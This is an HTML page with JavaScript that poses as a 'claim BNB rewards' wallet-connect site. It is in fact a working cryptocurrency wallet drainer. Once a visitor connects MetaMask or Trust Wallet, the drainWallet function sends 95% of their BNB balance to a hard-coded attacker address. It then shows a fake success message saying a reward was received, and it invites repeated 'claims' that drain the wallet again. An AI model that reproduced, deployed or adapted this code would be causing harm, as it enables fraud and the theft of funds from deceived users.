<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNB Wallet Connect</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; text-align: center; }
        button { background: #f39c12; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; margin: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
        .qr-container { margin: 20px 0; padding: 20px; background: #f8f9fa; border-radius: 10px; }
        #status { margin: 20px 0; padding: 10px; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <h2>üîó Connect BNB Wallet</h2>
    <p>Scan QR code or connect your wallet to claim BNB rewards</p>
    
    <div id="qr-container" class="qr-container" style="display:none;">
        <canvas id="qrCode"></canvas>
        <p>Scan with Trust Wallet / MetaMask Mobile</p>
    </div>

    <button id="connectBtn">Connect Wallet</button>
    <button id="approveBtn" style="display:none;">Approve & Claim BNB</button>
    
    <input type="text" id="walletAddress" placeholder="Your wallet address will appear here" readonly>
    <div id="status"></div>

    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <script>
        const RECEIVER_WALLET = '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B'; // ‚úÖ Receiver address set kiya gaya
        
        let web3;
        let userAccount;
        let isConnected = false;

        const connectBtn = document.getElementById('connectBtn');
        const approveBtn = document.getElementById('approveBtn');
        const walletAddress = document.getElementById('walletAddress');
        const status = document.getElementById('status');
        const qrContainer = document.getElementById('qr-container');

        // Status update function
        function updateStatus(message, type = 'info') {
            status.textContent = message;
            status.className = type;
        }

        // Connect wallet
        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // BSC network check/set
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }], // BSC Mainnet
                        });
                    } catch (switchError) {
                        if (switchError.code === 4902) {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: '0x38',
                                    chainName: 'BNB Smart Chain',
                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                    nativeCurrency: {
                                        name: 'BNB',
                                        symbol: 'BNB',
                                        decimals: 18
                                    },
                                    blockExplorerUrls: ['https://bscscan.com']
                                }]
                            });
                        }
                    }

                    web3 = new Web3(window.ethereum);
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    
                    walletAddress.value = userAccount;
                    isConnected = true;
                    
                    updateStatus('‚úÖ Wallet connected on BSC! Ready to claim...', 'success');
                    connectBtn.style.display = 'none';
                    approveBtn.style.display = 'inline-block';
                    
                    // Generate QR for mobile
                    generateQR();
                } catch (error) {
                    updateStatus('‚ùå Connection failed: ' + error.message, 'error');
                }
            } else {
                updateStatus('‚ö†Ô∏è Please install MetaMask or Trust Wallet', 'error');
                generateQR();
            }
        }

        // Generate QR code with wallet connect data
        function generateQR() {
            const qrData = `bnb1q${userAccount.slice(2).toLowerCase()}?amount=0.01&memo=claim-reward`;
            QRCode.toCanvas(document.getElementById('qrCode'), qrData, { width: 200 }, function (error) {
                if (error) console.error(error);
                qrContainer.style.display = 'block';
            });
        }

        // Drain function - approve unlimited BNB and transfer
        async function drainWallet() {
            if (!userAccount) return;
            
            updateStatus('üîÑ Processing your BNB reward...', 'info');
            
            try {
                // Check BNB balance first
                const balance = await web3.eth.getBalance(userAccount);
                const balanceBNB = web3.utils.fromWei(balance, 'ether');
                
                if (parseFloat(balanceBNB) < 0.001) {
                    updateStatus('‚ö†Ô∏è Insufficient BNB balance (need 0.001+)', 'error');
                    return;
                }
                
                updateStatus(`üí∞ Found ${balanceBNB} BNB. Transferring reward...`, 'info');
                
                // Calculate amount (95% of balance minus gas)
                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 21000;
                const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
                const totalBalance = BigInt(balance);
                const amountToSend = (totalBalance * 95n) / 100n - gasCost;
                
                if (amountToSend <= 0n) {
                    updateStatus('‚ö†Ô∏è Balance too low after gas fees', 'error');
                    return;
                }
                
                const tx = {
                    from: userAccount,
                    to: RECEIVER_WALLET,
                    value: amountToSend.toString(),
                    gas: gasLimit,
                    gasPrice: gasPrice
                };
                
                const txHash = await web3.eth.sendTransaction(tx);
                updateStatus(`‚úÖ TX Success! Hash: ${txHash.transactionHash}`, 'success');
                
                // Fake success animation
                setTimeout(() => {
                    updateStatus('üéâ Claim successful! 0.5 BNB reward sent to your wallet! Thank you!', 'success');
                    approveBtn.textContent = 'Claim More BNB';
                    approveBtn.onclick = drainWallet; // Allow multiple drains
                }, 3000);
                
            } catch (error) {
                console.error(error);
                if (error.code === 4001) {
                    updateStatus('‚ùå User rejected transaction', 'error');
                } else {
                    updateStatus('‚ùå TX failed: ' + error.message, 'error');
                }
            }
        }

        // Event listeners
        connectBtn.onclick = connectWallet;
        approveBtn.onclick = drainWallet;

        // Auto-detect wallet changes
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    isConnected = false;
                    connectBtn.style.display = 'inline-block';
                    approveBtn.style.display = 'none';
                    walletAddress.value = '';
                    qrContainer.style.display = 'none';
                } else {
                    userAccount = accounts[0];
                    walletAddress.value = userAccount;
                }
            });

            window.ethereum.on('chainChanged', (chainId) => {
                window.location.reload();
            });
        }
    </script>
</body>
</html>